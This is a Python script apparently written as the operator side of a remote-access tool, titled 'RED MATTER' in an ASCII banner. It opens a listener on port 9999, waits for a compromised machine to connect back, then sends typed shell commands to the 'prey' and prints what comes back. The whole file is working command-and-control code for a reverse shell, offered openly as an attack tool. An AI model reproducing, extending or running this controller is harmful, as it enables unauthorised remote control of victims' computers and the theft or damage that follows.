from socket import *
import os
import sys

host = gethostbyname(gethostname())
port = 9999
ADDR = (host,port)

def create():
    global session

    session = socket(AF_INET, SOCK_STREAM)
    session.bind(ADDR)
    session.listen(1)


def banner():
    print("""                - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
              |       ######  ####### ######        #     #    #    ####### ####### ####### ######                |
              |       #     # #       #     #       ##   ##   # #      #       #    #       #     #               |
              |       #     # #       #     #       # # # #  #   #     #       #    #       #     #               |
              |       ######  #####   #     #       #  #  # #     #    #       #    #####   ######                |
              |       #   #   #       #     #       #     # #######    #       #    #       #   #                 |
              |       #    #  #       #     #       #     # #     #    #       #    #       #    #                |
              |       #     # # # # #  # # #        #     # #     #    #       #    # # # # #      #              |         
                - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  """)
    print("")
    print("                                                                                            --Created by Disaac")
    print("[+]Enter 'help' to solve your problem :)")

def send():

    if command != "help":
       try:
           connection.send(command.encode())
           print("[+]Command has been sent")
       except:
           print("[-]Command has not been sent")
    else:
        print("Now you can enter cmd command, then it will be sent to the prey x(")

def accept():
    global connection, addr

    try:
        print("[+]Wating for connection......")
        connection, addr = session.accept()
        print("[+]Connectiong is build up")
        banner()
    except:
        print("[-]Can not connect")



def console():
    global command
    command = input("[%s]$" % str(addr))


def listen():

    data = connection.recv(4096)
    print(data.decode())

def main():

    create()
    accept()
    while True:
        console()
        send()
        listen()

main()



